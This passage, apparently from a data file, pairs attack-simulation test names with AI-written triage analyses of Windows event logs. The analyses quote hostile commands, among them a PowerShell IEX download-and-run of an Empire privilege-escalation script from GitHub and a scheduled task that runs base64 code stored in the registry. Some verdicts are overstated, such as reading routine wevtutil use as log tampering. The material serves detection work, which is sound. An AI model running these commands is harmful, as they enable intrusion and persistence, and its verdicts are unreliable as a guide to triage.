   - Review network logs to trace potential lateral movement or data transfer patterns consistent with exfiltration.
   
3. **Remediation Steps:**
   - Restore affected systems from clean backups, ensuring no persistence mechanisms remain.
   - Implement enhanced monitoring for privileged account activities, especially on high-value targets like the CEO's machine.

4. **Prevention Measures:**
   - Strengthen endpoint detection capabilities and review PowerShell execution policies.
   - Conduct security awareness and privilege management to mitigate the risk of compromised accounts. 

**Conclusion:**
The activities identified are consistent with an advanced threat actor attempting to leverage administrative capabilities for malicious purposes. Prompt and comprehensive actions as outlined can mitigate potential damage and future risks."
Scheduled task Local,"Based on the provided Sysmon, Security, and Application logs, I will analyze for any indications of suspicious or malicious activities:

### Analysis:

1. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the `admin_test` account. 
   - Carried out by a high-privileged user (`IntegrityLevel: High`), which can be legitimate for administrative tasks but should be corroborated with the typical operations by this user.
   - The activity of `wevtutil.exe` could be normal, but when combined with other activities, should draw scrutiny.

2. **Scheduled Task Creation (`SCHTASKS`):**
   - The command `SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10` indicates that a task was created to execute `cmd.exe`, which is suspicious.
   - This task creation is a common technique to establish persistence or schedule a script for execution.

3. **High Privileges with NTLM Authentication:**
   - The use of NTLM for authentication and elevated privileges (`SeDebugPrivilege` and similar high-level privileges granted to `admin_test`) occur during the logged sessions.
   - These privileges, if not previously justified, could allow administrative actions that may be exploited.

4. **Logon and Privilege Escalation Events:**
   - The events include logons from specific IP addresses with subsequent privilege escalation using sensitive privileges not typically required for routine tasks. 

5. **Application Logs and Security Logs:**
   - Logon events with NTLM authentication, not usual in a domain environment unless compatibility is an issue.
   - EventID 4672 indicates privileges assigned at logon, which again includes sensitive rights like `SeDebugPrivilege`.

### Conclusion:

The execution pattern of certain processes, particularly `SCHTASKS /Create /SC ONCE...`, suggests potentially nefarious activities, most likely aiming to establish persistence or execute unauthorized tasks in the future.

The logs indicate **SUSPICIOUS** activity, as some entries, especially the creation of scheduled tasks and elevated privilege usage, could signify the potential compromise of the user account or the system if these patterns are not part of a known and documented administrative action.

### Guidance:
- **Immediate Actions:**
  - Verify whether the `admin_test` account was operating under normal circumstances and that these activities were part of authorized administrative actions.
  - Validate scheduled tasks and revoke or investigate any unauthorized entries.
  - Review the network traffic related to the involved IP addresses and accounts.
  - Conduct a thorough endpoint security assessment and scan for potential malware.

- **Further Investigation:**
  - Cross-reference with other logs (e.g., Firewall, VPN logs) to determine any abnormal access patterns.
  - Consider employing deeper forensics, such as memory or disk analysis, if unauthorized activities are substantiated.

- **Mitigation:**
  - Remove unnecessary privileges and rotate credentials for the `admin_test` account.
  - Increase monitoring for the creation of scheduled tasks and elevate awareness for NTLM usage.

The outcome suggests **SUSPICIOUS** activity, warranting further investigation to either dismiss or confirm the potential threat, taking appropriate incident response actions based on findings."
Process Injection with Go using CreateThread WinAPI,"Upon reviewing the provided log entries, I have identified a series of events that may potentially suggest malicious activity or warrant further investigation. Below is a thorough analysis:

### Application Logs
- The logs show normal operations related to Windows Defender and Software Protection Platform Service. These events alone do not indicate any suspicious activity.

### PowerShell Logs
- A significant detail to note is the execution of `powershell.exe` with a command referring to `CreateThread.exe` in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\CreateThread.exe -debug`. 
- This file path and execution context are unusual, especially if it's executed with the `-debug` flag, which may suggest debugging or unauthorized script activities. PowerShell is often leveraged in malicious attacks to run scripts or commands.

### Security Logs
- The Security log entries show time-related adjustments managed by `svchost.exe`. These interactions seem typical for synchronization tasks and do not immediately indicate malicious behavior by themselves.

### Sysmon Logs
- The logs show various legitimate Windows processes executing, like `conhost.exe`, `wevtutil.exe`, `svchost.exe`, and operations consistent with normal system behavior.
- However, the creation and execution of `CreateThread.exe` warrant attention. This might be an indicator of a file being downloaded or used for malicious purposes.
- The Process Creation event for `powershell.exe` as logged confirms its suspicious command line initiation, pointing to the execution of `CreateThread.exe`, which correlates with the PowerShell log analysis. This hints at potentially unauthorized or malicious script execution.

### System Logs
- These primarily show routine operations of system services and time adjustments related to Windows services. No indications of compromise here.

### Assessment:
The main concern is the PowerShell execution of `CreateThread.exe` from a temporary directory. While the log does not explicitly show what the script or executable does, such behavior is often characteristic of malware or an unauthorized script being executed.

**Resolution: SUSPICIOUS**

### Guidance:
1. **Immediate Action:**
   - Isolate the host machine (Server002) from the network to prevent potential spread or further unauthorized access.
    
2. **Investigation:**
   - Examine the content and origin of `CreateThread.exe` located in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\`.
   - Review the user's activity (SERVER002\\admin_test) for any signs of irregular activity, particularly around the time when the suspicious script was executed.
   - Check for any signs of lateral movement within the network or attempts to escalate privileges.

3. **Post-Incident:**
   - Verify that all security patches and updates have been applied to mitigate vulnerabilities.
   - Evaluate the implementation of restrictive PowerShell execution policies and enhanced logging.
   - Conduct a comprehensive security assessment of the server and network for better prevention and detection capabilities.

Given the logs' contents and potential risk, further investigation is required to determine the exact nature and extent of the activity."
Remote Service Installation CMD,"Upon reviewing the provided logs, I identified several activities and patterns that should be considered suspicious and might indicate potential malicious behavior:

1. **PowerShell Execution**:
   - The logs show the execution of `powershell.exe` by the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, it is often used by attackers for various tasks such as downloading payloads, running scripts, or changing system configurations illicitly. However, without additional details such as command-line arguments, it is challenging to determine if this instance is malicious.

2. **Usage of `wevtutil.exe`**:
   - The frequent execution of `wevtutil.exe` raises suspicions. This tool is used for manipulating event logs, which could indicate an attempt to cover tracks by deleting or modifying log entries. Such activities typically indicate an attacker trying to erase evidence of malicious activity.

3. **Service Creation via `sc.exe`**:
   - The logs display the creation of a service called `fileTestService_CMD` with `sc.exe`, which is used to manage services in Windows. It references an executable located in the Temp directory, often a red flag indicating potential persistence mechanisms used by malware. The service is set to start automatically, increasing the risk of executing unwanted programs upon reboot.
   - The execution of the `fileService.exe` binary from a non-standard and temporary location (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`) deserves attention as legitimate services typically do not run from temporary directories.

4. **Process Integrity and System Activities**:
   - The logs show processes being executed with high integrity levels, which indicates the possibility of privilege escalation.
   - The sequence of automatically starting services shows attempts to maintain persistence.

5. **General Observation**:
   - No entries in Security or PowerShell-specific logs were provided, limiting comprehensive insight into authentication, privilege escalation, and specific PowerShell activities.

**Assessment**: Based on the cluster of activities, particularly the persistence mechanism via service creation in a temporary directory, combined with the usage pattern of system utilities like `wevtutil.exe` and `sc.exe`, this scenario leans more towards potentially **MALICIOUS** behavior. It is suggestive of a compromise where the adversary intends to establish and maintain control over the system.

**Recommendations**:
- Conduct immediate live system monitoring and memory analysis to validate whether the processes and services from Temp directories show anomalous activities or modifications.
- Investigate further into the specifics of command-line arguments used in PowerShell executions if possible.
- Trace the origin of the `fileService.exe` to assess its legitimacy and potentially remove it.
- Inspect network connections and correlate them with unusual activity timestamps to identify potential data exfiltration or lateral movement.
- Review security configurations to enhance logging and monitoring for early detection of similar activities in the future.
- Conduct a full-scale incident response investigation to fully assess the scope and impact of the potential compromise.

Final Resolution: **MALICIOUS**"
Task Scheduler via VBA,"Upon analyzing the provided Windows event logs, several indicators suggest malicious activity:

**1. Powershell Activity:**
   - The PowerShell logs show invocation of the script `Invoke-MalDoc.ps1` hosted on `raw.githubusercontent.com`. This script appears to be executed via the `Invoke-Expression` (IEX) command, which can run commands or scripts received from the internet. The script attempts to run a macro file associated with Microsoft Word using the `Invoke-MalDoc` command.
   - This pattern is indicative of a potential malicious activity where PowerShell is used to download and execute scripts from an external server, a common tactic used by attackers.

**2. Sysmon Logs:**
   - Multiple Sysmon entries detail the execution of processes, including `powershell.exe` with command lines closely associated with downloading and executing potentially malicious scripts. 
   - This includes execution by the user `SERVER002\\admin_test`; processes like `wevtutil.exe` are also seen being used to export logs, which may suggest attempts to cover tracks or exfiltrate data.
   - The presence of multiple `conhost.exe` and `wevtutil.exe` processes executed by the same user close to the PowerShell activities raises further suspicion.

**3. Process Execution:**
   - Frequent spawning of processes like `PowerShell`, `conhost.exe`, and `whoami.exe` can be indicative of futher system reconnaissance or script driven attacks.
   - The presence of high integrity level processes and the path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\` is indicative of potentially harmful activities as TEMP directories are commonly associated with malware operations due to their write permissions.

**Assessment:**
Given the use of PowerShell to download and execute scripts from an external URL combined with suspicious process executions, there are strong indicators of malicious activity. The behavior is consistent with common tactics used during an intrusion, where PowerShell scripts are used for downloading and executing payloads.

**Resolution:**
- **MALICIOUS**: The logs contain activity that is highly suggestive of a compromise. Immediate action is required to isolate the system, prevent further execution of potentially malicious commands, and conduct a detailed investigation. 

**Guidance on How to Proceed:**
  - Isolate the affected system (Server002) to prevent further spread or data exfiltration.
  - Conduct a full forensic analysis of the system to identify any advanced persistent threats (APTs) or additional malware components.
  - Review any new accounts or permissions added and scrutinize recently installed software.
  - Ensure that all sensitive data and systems are protected, considering the potential for data exfiltration.
  - Update all relevant security policies and conduct network-wide scanning for similar anomalies to preemptively address any further risks."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"Based on the provided logs, there are several points of interest that potentially indicate suspicious or malicious activity.

### Analysis:

1. **Windows PowerShell Log:**
   - The PowerShell commands executed are:
     - Create a directory at `$env:TMP\filetest\`.
     - Copy `calc.exe` to this new directory.
     - Modify the registry to set the User Shell Folders startup path to the created directory.
   - This behavior is suspicious, as it aligns with tactics to achieve persistence by placing a binary in a commonly executed folder at system startup (i.e., using a modified user shell folder path).
   - The copying of system binaries to atypical locations can be indicative of preparation for execution in an unexpected context, which is typical in malware operations.

2. **Security Log:**
   - Event ID 4672 indicates high privileges were given to the account `admin_test`, including privileges like `SeDebugPrivilege`, which is sensitive and potentially dangerous if used maliciously.
   - Event ID 4624 shows a successful NTLM authentication as `admin_test` from a remote machine (`LogonType: 3`), which could suggest a lateral movement attempt.
   - The presence of privileged access immediately following this remote logon is suspect.

3. **Sysmon Log:**
   - The execution of `wevtutil.exe` and multiple instances of `conhost.exe` as `SERVER002\admin_test` suggests some form of event log querying or tampering.
   - The sequence of `powershell.exe` execution with the same suspicious command line as noted in the PowerShell log confirms the use of script to manipulate system settings.

4. **System Log:**
   - The logged time change events (Event ID 1 and 24) involving `svchost.exe` may have been an attempt to hide activity. Time misconfiguration can be exploited by attackers to blur the traceability of log entries.

### Assessment:
The behavior observed in the logs shows indicative attempts of persistence, potential privilege escalation, and a methodical approach to cover tracks. These signals often accompany targeted attacks aimed at maintaining long-term access within a system. The activities noted go beyond typical benign usage patterns and align with known attack vectors.

### Resolution: MALICIOUS

Based on the analyzed logs, the actions denote a high likelihood of malicious activity. The combination of registry manipulation for persistence, suspicious use of PowerShell scripts, high-level privileged access acquired remotely, and possible log tampering suggests a coordinated attempt to compromise the system.

### Guidance:
- Immediately isolate the affected system (`Server002`) from the network to prevent further spread.
- Conduct a full forensic analysis to understand the scope of the breach.
- Reset passwords for affected accounts, especially those of `admin_test`.
- Review group membership and privileges for user accounts.
- Ensure all systems are updated and apply any necessary patches.
- Educate users on recognizing phishing attempts or other initial infection vectors that could have been exploited.
- Monitor network traffic for indications of data exfiltration.

Engaging with a cybersecurity incident response team might be required to thoroughly analyze the extent of the compromise and to recover safely from this intrusion."
Azure - adding user to Azure role in subscription,"Based on the logs provided, we can observe the following:

1. **Security Logs Analysis:**
   - The Event ID 4798 entries, which indicate enumeration of local group membership, all trace back to `CompatTelRunner.exe`. This could be benign as CompatTelRunner is a legitimate Windows service related to compatibility diagnostics, but it executing enumeration tasks is uncommon.
   - Event ID 4672 shows special privileges assigned during a logon session, including `SeDebugPrivilege`. This is often normal for SYSTEM processes, but it is noteworthy when combined with other activities if not expected.

2. **Sysmon Logs Analysis:**
   - Multiple instances of `powershell.exe` and `wevtutil.exe` executed by `SERVER002\admin_test` were observed. 
   - The PowerShell instance is running a script with `Connect-AzAccount`, manipulating Azure AD and roles. This could suggest the use of PowerShell for automation within Azure environments, but it could also indicate attempts to modify permissions or check user roles maliciously.
   - The presence of `wevtutil.exe`, which is used for managing event logs, being frequently executed could suggest log tampering; however, the actions themselves are not inherently malicious within this context.

3. **Windows PowerShell Logs:**
   - The PowerShell script connects to an Azure environment and checks for existing users with very specific roles and subscriptions. This behavior could either be part of a legitimate administrative script or an attempt at unauthorized changes.

4. **Overall Assessment:**
   - The use of high-level permissions, PowerShell scripting to manage Azure roles, and repeated `wevtutil.exe` execution, when combined together especially in close time intervals, could indicate a heightened risk of misuse or unauthorized access.

**Resolution: SUSPICIOUS**

Given these observations:
- **Threats/Risks Identified:** Potential misuse of administrative access using PowerShell, possible enumeration for malicious purposes, and unusual task execution by `CompatTelRunner.exe`.
- **Guidance:** Investigate the purpose of the PowerShell script executed by `admin_test`, verify legitimate use. Check for unauthorized changes in Azure roles and ensure all actions are audited. Review the need and legitimacy of recent task executions involving `CompatTelRunner.exe` and cross-reference with other systems logs.
"
Scheduled Task Executing Base64 Encoded Commands From Registry,"Based on the provided Windows event logs, I've identified several key events that bear scrutiny:

### Key Observations:
1. **Time Change Events:**
   - There are logs indicating that the system time was altered. While this could be benign, it's a common technique used by malware to avoid time-based detections and investigations. Log entries:
     - Security EventID 4616.
     - Kernel-General EventID 1.

2. **Suspicious Command Line Execution:**
   - The command line executed by `cmd.exe` is particularly suspicious:
     ```plaintext
     cmd.exe /c reg add HKCU\SOFTWARE\file-data.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""file-data.005"" /TR ""cmd /c start /min """" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\file-data.005).test)))"" /sc daily /st 07:45
     ```
   - Here, a registry entry is being added to store base64 encoded data. This data is then used in a scheduled task that executes a PowerShell command to decode and run potentially malicious code. This behavior is indicative of persistence mechanisms utilized by malware.

3. **Scheduled Task Creation:**
   - The creation of a scheduled task (`schtasks.exe`) that runs the aforementioned PowerShell command is aimed at maintaining persistence and potentially executing malicious payloads.

4. **Processes and Users of Interest:**
   - Processes like `wevtutil.exe`, `cmd.exe`, `reg.exe`, and `schtasks.exe` were executed under the user `SERVER002\\admin_test`. This user account may have been compromised to execute these operations.
   - `wsmprovhost.exe` is listed as a parent process, which often runs under legitimate circumstances, but its use here to launch a `cmd.exe` performing malicious activity is suspicious.

### Assessment:
- **BENIGN:**
  - Regular system operations with no indication of anomaly or compromise.

- **SUSPICIOUS:**
  - Use of built-in tools to modify registry and schedule tasks. Need further investigation, especially the legitimacy of the encoded content and the intent of the scheduled task.

- **MALICIOUS:**
  - Confirmed malicious behavior based on process executions, encoded content, and methods to achieve persistence. 

### Conclusion:
Upon reviewing the logs, the activity observed aligns with tactics often employed by malware to achieve persistence and execute potentially harmful commands. The suspicious use of encoded registry data and scheduled tasks to invoke PowerShell implies a sophisticated attempt to execute or maintain a malicious presence on the host. Therefore, the situation is assessed as **MALICIOUS**.

### Recommended Actions:
1. **Immediate Investigation:**
   - Investigate the user account `SERVER002\\admin_test` for signs of compromise.
   - Decode and analyze the base64 content for malicious payloads.

2. **Containment:**
   - Disable the scheduled tasks and inspect all entries in `HKCU\SOFTWARE\file-data.005`.
   - Consider isolating the machine from the network to prevent lateral movement while the investigation continues.

3. **Remediation:**
   - Change all credential keys and passwords associated with the compromised user.
   - Conduct a complete malware sweep and vulnerability assessment on this and surrounding systems.

4. **Enhanced Monitoring:**
   - Increase logging and monitoring on critical accounts and processes, especially looking out for similar tasks or encoded entries.

5. **Security Policy Review:**
   - Evaluate existing security practices, particularly around scheduled tasks and PowerShell execution, to prevent such incidents in the future."
Domain Password Policy Check: No Special Character in Password,"Based on the logs provided, I will analyze each log category for suspicious, potentially malicious, or benign behavior.

### **Analysis of Windows PowerShell Log:**

1. **PowerShell Script Involved in Credential Handling**:
   - The PowerShell log entries repeatedly contain a script handling user credentials. The script aims to store and verify user credentials from a file under the local app data directory and set new Active Directory (AD) account passwords.

2. **Potential Misuse of PowerShell**:
   - PowerShell is frequently exploited in attacks for credential harvesting and privilege escalation. In this scenario, the script seems to interact with sensitive data and handles AD account passwords, which raises concern, especially if this execution is unauthorized or unexpected.

3. **Plain Text Password Handling**:
   - The script utilizes hard-coded plain text passwords (""UpperLowerLong333noSpecialChar""), which is a poor security practice that can expose sensitive credentials if intercepted by unauthorized users.

### **Analysis of Sysmon Log:**

1. **Sysmon Events**:
   - The Sysmon logs capture various process creation events many of which link back to PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) and wevtutil utility (`C:\\Windows\\System32\\wevtutil.exe`).

2. **Elevated Privileges**:
   - Multiple processes, such as wevtutil and conhost, are executed under a user with high integrity level, `SERVER002\\admin_test`. If this user account does not typically run administrative tasks, it could suggest privilege misuse or escalation.

3. **Frequent Launch of Edge Installer Processes**:
   - Multiple entries for Microsoft Edge installer (`setup.exe`) with the `--system-level` flag indicate system-wide modifications. Such actions, although not inherently malicious, should be verified for legitimacy, especially if these installations were not scheduled or expected.

### **Analysis of Security Log:**

1. **Audit for Group Membership Changes**:
   - Event ID 4799 indicates an audit of group membership enumeration for the Built-in Users group. Such events are standard in system operation; however, if the triggering of this event does not correspond with normal administrative activities, it could hint towards reconnaissance activity by an attacker or insider.

### **Conclusion and Resolution:**

**Resolution: SUSPICIOUS**

The logs show potentially suspicious activities for the following reasons:
- PowerShell script handling credentials, involving weak practices (e.g., hard-coded passwords) and AD interaction.
- Elevated privileges and system utilities (e.g., wevtutil) being run by an administrative user, which can be normal but requires confirmation of legitimacy.
- Multiple executions of Edge installer tasks at the system level that may indicate unauthorized installations or updates.

### **Guidance on How to Proceed:**

1. **Credential Handling and Security**:
   - Investigate the origin of the PowerShell script to determine if it is authorized and necessary.
   - Review password handling practices for compliance with security policies. Address hard-coded credentials by implementing best practices such as using secure vaults or encryption.

2. **Review User Privileges**:
   - Validate the privileges associated with the `admin_test` account. Confirm if the activities logged align with expected user actions.

3. **Verify Software Installations**:
   - Check the legitimacy of Microsoft Edge installations that occurred. Ensure these actions were authorized by system administrators.

4. **Audit Log Consistency and Anomalies**:
   - Further review logs for consistency and any signs of additional anomalies. Cross-reference with other security tools such as the EDR that triggered the initial alert.

By following these steps, you can determine whether further investigative actions are required or implement remediation strategies against potential threats."
Bad Potato,"### Detailed Analysis of Logs

Upon reviewing the provided logs, several events are noteworthy and indicate potentially malicious activities. Here is a breakdown of the analysis:

1. **Execution of Suspicious Processes:**
   - A PowerShell script was executed with a command line specifying that it should start a process named `BadPotato.exe` and interact with `notepad.exe`. The use of `BadPotato.exe` is particularly concerning, as it is commonly associated with a privilege escalation exploit leveraging a vulnerability in the Windows privilege handling.
   - The PowerShell script is seen stopping `BadPotato.exe` and `notepad.exe` after 20 seconds, probably to clean up traces quickly after leveraging the exploit.

2. **Unusual Process Creation:**
   - There are multiple instances of processes like `wevtutil.exe` and `conhost.exe` running under the user `SERVER002\\admin_test`. While these processes can be legitimate, the context in which they are used here and their rapid sequential executions raise suspicions. 
   - The execution of `whoami.exe` and `hostname.exe` following the PowerShell script may indicate an attempt to verify the results of privilege escalation or gather system information post-exploitation.

3. **High Integrity Levels:**
   - The suspicious PowerShell commands were executed with high integrity levels, indicative of higher privileges than normally expected, especially if they stem from an unauthorized escalation.

### Assessment of the Situation

These logs present behaviors consistent with an attempt to escalate privileges and possibly cover tracks or maintain persistence on a system. The execution of `BadPotato.exe` is especially concerning due to its association with well-known exploits for elevating privileges on Windows systems.

### Threats and Risks Identified

- **Privilege Escalation:** The use of `BadPotato.exe` strongly suggests an attempt was made to gain elevated privileges, representing a severe security threat if successful.
- **System Compromise:** Unauthorized execution of scripts with high privileges can lead directly to system compromise, allowing an attacker to carry out further unauthorized activities unnoticed.

### Guidance on How to Proceed

- **Immediate Containment:** Isolate the affected host (`Server002`) from the network to prevent further dissemination of the potential exploit.
- **Detailed Forensic Analysis:** Conduct a deeper investigation to understand the full scope of the compromise. Retrieve memory dumps, other logs, and artifacts for external analysis if needed.
- **Privilege Review:** Audit and review accounts used with administrative privileges, especially `admin_test`, for unauthorized changes.
- **Patch Management:** Ensure all systems, especially those related to network security, are up to date with the latest patches to mitigate known vulnerabilities that could be exploited similarly to how `BadPotato.exe` is typically used.

### Resolution

**MALICIOUS** - The logs contain clear evidence of potentially malicious activities aimed at exploiting known vulnerabilities to elevate privileges, warranting immediate response actions."
Add a driver,"Based on the provided Windows event logs, here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - In this log set, `wevtutil.exe` (a legitimate Windows Event Log utility) is executed multiple times in quick succession by the user `SERVER002\\admin_test`. Similarly, `conhost.exe` (a component required to run command-line instructions) appears repeatedly.
   - This type of behavior could be normal under certain circumstances, but repeated rapid execution, particularly of `wevtutil.exe`, could indicate an attempt to clear or tamper with Windows event logs, which is a common tactic employed by malicious actors to cover their tracks.

2. **Usage of `cmd.exe` with `pnputil.exe`:**
   - The command line used by `cmd.exe` matches a potentially malicious pattern: `cmd.exe /c pnputil.exe /add-driver ""C:\\Windows\\INF\\usbstor.inf""`.
   - The addition of drivers using `pnputil.exe` can be legitimate but is often associated with efforts to introduce malicious drivers into the system or to manipulate existing ones. This makes the command execution noteworthy and requires further scrutiny.

3. **Abnormal Time Adjustment:**
   - There is evidence of a time change event (`Event ID 4616`), which could be indicative of an attempt to manipulate time stamps for event logs. This adjustment, while occasionally necessary, in combination with other suspicious activities can be a red flag.

4. **Execution of `whoami.exe` and `hostname.exe`:**
   - These command-line tools, which display information about the user and system hostname, can potentially signify reconnaissance actions, often undertaken by an attacker after gaining a foothold on the system.

### Indicators of Malicious Activity or Compromise:
- The combination of repeated suspicious process executions (`wevtutil.exe`, `pnputil.exe`), time modification, and typical reconnaissance commands suggests there might be an active attempt to manipulate the system or collect information for malicious purposes.

### Assessment:
- Given the details from the logs, the pattern of behavior is consistent with techniques used in lateral movement and defense evasion. The utilization of `wevtutil.exe` and modification commands, while legitimate on their own, in this context can indicate malicious intentions. The timeframe and frequency add to the suspicion.

### Resolution:
- **SUSPICIOUS:** The logs contain activities that are genuinely concerning and warrant a more detailed investigation. 

### Guidance on How to Proceed:
1. **Investigate the Origin and Context:**
   - Conduct a thorough analysis to understand when `admin_test` user account initiated these actions and whether this aligns with legitimate administrative tasks.
   - Review user access logs, scheduled tasks, and any remote execution logs to determine if this began from a remote connection.

2. **Validate Modifications and Access Patterns:**
   - Compare system states before and after the `pnputil.exe` command execution to verify unwanted drivers or changes.
   - Assess whether there are notable gaps in security policies about log access and time change permissions.

3. **Conduct a Comprehensive Forensic Review:**
   - Engage in a deep-dive forensic analysis to ascertain if any unauthorized access, privilege escalations, or data exfiltration attempts occurred.
   - Examine potential indicators of a compromise such as unusual network connections, unauthorized changes to user privileges, and anomalies in other security logs.

By categorizing this activity as suspicious, further investigation can help determine the intent and extent of the potential threat, ensuring robust protective measures are maintained."
Named pipe client impersonation,"Based on the provided Windows event logs, the following analysis outlines potentially suspicious and malicious activities:

1. **PowerShell Logs:**
   - Multiple PowerShell executions are noted, indicating the use of `IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/.../Get-System.ps1' -UseBasicParsing)`. This command downloads and executes a script from a public GitHub repository related to BC-SECURITY's Empire, which is a known post-exploitation framework used for privilege escalation and other potentially malicious activities.
   - The use of `Get-System -Technique NamedPipe -Verbose` within this context could indicate an attempt at privilege escalation. The technique leverages named pipes, which are often used in lateral movement or privilege escalation attacks.
   - The presence of such PowerShell activity is highly suspicious and typically indicative of malicious attempts as it appears to be executing scripts for system reconnaissance or privilege escalation without explicit user initiation.

2. **Security Logs:**
   - The log entries for elevated privilege assignments to the user `admin_test` (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) in Event IDs 4672 are indicative of potential lateral movement or privilege misuse. While these privileges may be justified in certain administrative contexts, given the association with suspicious PowerShell activity, they raise concern.

3. **Sysmon Logs:**
   - The process execution logs do not demonstrate any atypical behavior on their own when separated from other context, as most relate to legitimate Windows processes (e.g., `svchost.exe`, `wevtutil.exe`, `conhost.exe`, etc.). However, the use of PowerShell (`powershell.exe`) to execute network-acquired scripts suggests possible evasion tactics.
   
4. **System Logs:**
   - The system logs primarily indicate time changes being logged, which could be benign or indicative of attempts to obfuscate activity. However, without context linking these specifically to malicious activity, they remain neutral.

### Assessment and Conclusion:
- **MALICIOUS:** The execution of a PowerShell script obtained from a known offensive security toolkit, particularly one used for privilege escalation, alongside observed privilege escalation activities, strongly indicates malicious activity. This behavior aligns with tactics used in targeted attacks where system reconnaissance and privilege escalation are attempted to gain more control over the system.

**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent further potential lateral movement or data exfiltration.
   - Terminate any related suspicious PowerShell sessions or scripts currently active.

2. **Forensic Investigation:**
   - Conduct a detailed forensic analysis on the host to identify any additional malicious tools or scripts that may have been deployed.
   - Correlate with network logs to determine if any data exfiltration attempts were made or if the malicious actor moved to other network segments.

3. **Security Measures and Monitoring:**
   - Strengthen PowerShell logging and monitoring for execution of remote scripts or downloads.
   - Review and potentially restrict privileges for accounts involved in this activity, ensuring principle of least privilege is applied.
   - Implement stricter intrusion detection and prevention rules for activities indicative of the tactics observed.

4. **Remediation and Update:**
   - Patch and update all systems to mitigate potential vulnerabilities leveraged during this attack.
   - Conduct awareness training for users to spot phishing or social engineering attempts that might have led to this compromise.

This assessment concludes with a confirmatory indication of malicious activity. Immediate remediation actions should be implemented in accordance with the outlined guidance."
RunPE via VBA,"**Detailed Analysis of Event Logs:**

1. **Security Logs:**
   - Events 4624 and 4672 indicate logon and special privileges assignments for the SYSTEM user. While SYSTEM acquiring privileges like `SeDebugPrivilege` is normal, this process repeatedly occurs in a short time frame, causing concern as it could be used for privilege escalation or lateral movement by adversaries if combined with other suspicious activities.
   - Event 4798: Queries on user accounts like ""Administrator"", ""admin_test"", etc., can be suspicious if unexpected, as these queries might relate to account reconnaissance or privilege evaluations.

2. **Application Logs:**
   - No explicit threats detected. Logs mostly pertain to Software Protection Service activities, which are typical maintenance operations.

3. **Windows PowerShell Logs:**
   - The PowerShell logs highlight a highly suspicious activity. The execution of a PowerShell script from a remote source (`raw.githubusercontent.com`), specifically `Invoke-MalDoc.ps1`, suggests potential malicious scripting activities. The command line arguments and script invocation show it targeting macro execution in Word, indicating a likely attempt to exploit document vulnerabilities.

4. **Sysmon Logs:**
   - Several events show PowerShell and other processes running under privileged accounts like SYSTEM and NETWORK SERVICE. 
   - The existence of `wevtutil.exe` being executed by `admin_test` user, especially with unloading event logs, can indicate log tampering or forensic evasion attempts.
   - High frequency of host enumeration tools and commands like `hostname.exe` and `whoami.exe` may suggest system enumeration or footprinting.
   - A recurring pattern of processes like `svchost.exe`, and others, are common and relate to typical Windows service operations but under the masquerading conditions (if combined with aforementioned evidence), could point to potential misuse.

**Assessment:**
- The presence of PowerShell logging downloading and executing scripts from the web is the most glaring cybersecurity issue here. Combined with active system enumeration and possibly altered event logs indicative of `wevtutil.exe` usage, there is strong evidence for malicious activity. These behaviors align with typical intrusion techniques for persistence, execution, and defense evasion in a potentially compromised system.

**Resolution:**
- **MALICIOUS** - Conclusive evidence of hostile activity. Immediate isolation and further forensic examination of the affected system are advised to mitigate harm and prevent lateral expansion within the network.

**Guidance on How to Proceed:**
- **Isolate the System:** Disconnect the affected host from the network to prevent any potential further spreading.
- **Forensic Investigation:** Conduct a deeper forensic analysis on the system images including memory and disk to identify the full scope of the compromise.
- **Block Malicious IPs and Domains:** Implement block rules for suspicious domains and IPs detected from the PowerShell execution and command and control setup.
- **Patch Vulnerabilities and Audit Accounts:** Ensure that all applications, particularly Office applications, are up to date. Review and audit domain account roles and aging passwords.
- **Educate Users:** Increase awareness and training for employees to recognize phishing and spear-phishing attempts."
Reg Key RunOnce,"Based on the analysis of the provided Windows event logs, here's a detailed assessment:

1. **Security Logs**: There is repeated evidence of the system time being set back (`EventID: 4616`). This is typically done by the `svchost.exe` process, which is a legitimate Windows process. However, changing system time can be an indicator of suspicious activity, especially if it's done to evade logging mechanisms or to manipulate time-based software behavior.

2. **Sysmon Logs**:
   - There are entries involving the execution of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `reg.exe` processes by `admin_test` user account, which may indicate an operational or administrative check. However, the registry modification using `reg.exe` to add an entry to the `RunOnceEx` registry key for a DLL is noteworthy and suspicious. This is a common persistence mechanism used by malware.
   - The presence of `cmd.exe` executing a registry addition command under a high integrity level indicates possible privilege escalation or malware persistence attempt.
   
3. **Application and System Logs**:
   - The entries regarding `MicrosoftEdgeUpdate.exe` and `Service stopped` events seem to be typical of regular software updates or maintenances, especially if they are legitimated and signed by Microsoft. No detailed indicators suggest they are related to malware activity.
   
4. **Potential Indicators of Compromise**:
   - The modification of the registry to include a RunOnceEx entry is concerning. This could potentially allow persistent execution of malicious code.
   - Although there are legitimate uses for tools like `whoami.exe`, frequent and unnecessary usage can be suspicious, especially if combined with other red flags like registry modifications.
   
### Resolution:

Despite the legitimate appearance of some activities, the combination of registry changes, execution of potentially system-altering commands, and context of the investigation suggest needing further scrutiny.

- **Resolution**: **SUSPICIOUS**  
This activity requires further investigation. It is highly advised to perform a forensic analysis of the system's filesystem and memory (if possible) to check for unknown or unusual DLLs at the given path, and stop any subsequent execution from the `RunOnceEx` registry. It would also be prudent to check for any unauthorized scheduled tasks or startup items and review any recent changes to critical system files or configurations."
